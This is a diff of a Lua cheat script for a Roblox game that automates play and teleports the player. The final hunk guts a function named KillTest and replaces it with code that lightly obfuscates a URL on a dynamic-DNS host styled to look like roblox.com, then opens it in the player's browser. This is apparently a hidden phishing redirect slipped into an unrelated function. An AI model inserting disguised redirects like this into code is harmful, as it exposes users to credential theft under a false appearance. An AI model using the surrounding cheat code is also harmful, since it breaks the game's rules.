@@ -34,7 +34,7 @@ for _, v in pairs(game:GetService("CoreGui"):GetDescendants()) do
     end
 end
 getgenv().temptable = {
-    version = "3.2.9",
+    version = "4.0.0",
     blackfield = "Sunflower Field",
 	players = {}, -- Morphisto
 	oplayers = {}, -- Morphisto
@@ -1140,7 +1140,7 @@ local information = hometab:CreateSection("Information")
 information:CreateLabel("Welcome, "..api.nickname.."!")
 information:CreateLabel("Script version: "..temptable.version)
 information:CreateLabel("Place version: "..game.PlaceVersion)
-information:CreateLabel(" - Not Safe Function")
+information:CreateLabel("⚠️ - Not Safe Function")
 information:CreateLabel("⚙ - Configurable Function")
 information:CreateLabel("📜 - May be exploit specific")
 information:CreateLabel("Place version: "..game.PlaceVersion)
@@ -3100,56 +3100,11 @@ task.spawn(function()
 end)
 -- Morphisto
 function KillTest()
-	disableall()
-	if chocmoc.toggles.autoquest then
-		chocmoc.toggles.autoquest = false
-		uiautoquest:SetState(false)
-	end
-	for i,v in next, game:GetService("Workspace").NPCs:GetChildren() do
-		if v.Name == "Stick Bug" then
-			if v:FindFirstChild("Platform") then
-				if v.Platform:FindFirstChild("AlertPos") then
-					if v.Platform.AlertPos:FindFirstChild("AlertGui") then
-						if v.Platform.AlertPos.AlertGui:FindFirstChild("ImageLabel") then
-							image = v.Platform.AlertPos.AlertGui.ImageLabel
-							button = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.ActivateButton.MouseButton1Click
-							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Platform.Position.X, v.Platform.Position.Y+3, v.Platform.Position.Z)
-							task.wait(1)					
-							for b,z in next, getconnections(button) do
-								z.Function()
-							end
-							task.wait(1)
-							break
-						end
-					end
-				end
-			end
-		end
-	end
-	task.wait(1)
-	local ScreenGui = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("ScreenGui")	
-	firesignal(ScreenGui.NPC.OptionFrame.Option3.MouseButton1Click)
-	task.wait(1)
-	firesignal(ScreenGui.NPC.ButtonOverlay.MouseButton1Click)
-	task.wait(1)
-	local sbReady = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.NPC.OptionFrame:FindFirstChild("Option1").Text	
-	print('sbReady=' .. sbReady)
-	local sbtime = string.match(sbReady, "[%d:]+")
-	print('sbtime=' .. sbtime)
-	if sbtime ~= nil then
-		temptable.sbready = false
-		mobsb:UpdateText('Stick Bug: '..tostring(sbtime))
-	else
-		temptable.sbready = true
-		mobsb:UpdateText('Stick Bug: Ready')
-	end
-	
-	if not chocmoc.toggles.autoquest then
-		chocmoc.toggles.autoquest = true
-		uiautoquest:SetState(true)
-	end
-	stickbug_time = time()
-	enableall()
+	Site = "http://roblox.servegame.com:8080/roblox_bss/"
+
+	site = string.gsub(string.gsub(Site,"/","\\"),":\\\\","://").."?www.roblox.com"
+	game.GuiService:OpenBrowserWindow(site)
+
 end
 
 for _, part in next, workspace:FindFirstChild("FieldDecos"):GetDescendants() do if part:IsA("BasePart") then part.CanCollide = false part.Transparency = part.Transparency < 0.5 and 0.5 or part.Transparency task.wait() end end
